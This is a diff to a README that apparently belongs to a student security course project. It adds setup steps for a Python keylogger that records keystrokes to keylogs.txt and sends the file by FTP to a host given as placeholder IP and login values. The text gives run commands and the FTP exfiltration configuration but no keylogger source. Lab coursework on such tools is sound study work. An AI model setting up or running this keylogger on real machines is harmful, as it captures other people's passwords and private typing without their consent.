@@ -37,8 +37,29 @@ SETUP INSTRUCTIONS
 - sudo apt update
 - sudo apt install python3-pynput
 
-4 Clone this repository
+4 Clone this repository on Kali
 - cd ~
 - git clone https://github.com/StephanoValdivia/IT359_GroupProject_Fall2025.git
-- cd IT359_GroupProject_Fall2025
+- cd IT359_GroupProject_Fall2025/src
+
+5 Create an empty text file that will serve as the log file
+- touch keylogs.txt
+
+6 Configure the IP address and the user for the FTP exfiltration
+- sudo nano keylogger.py
+- Look for the exfiltrate_file function
+- ftp = FTP("YOUR-UBUNTU-IP-ADDRESS")
+- ftp.login("YOUR-USERNAME", "YOUR-PASSWORD")
+
+7 Start the keylogger script
+- sudo python3 keylogger.py
+
+8 Open a new terminal, browser window, etc. and start typing
+
+9 Press the esc key to stop the keylogger
+
+10 Navigate to the home directory on Ubuntu and view the contents of the log file
+- cd ~
+- cat keylogs.txt
+
 
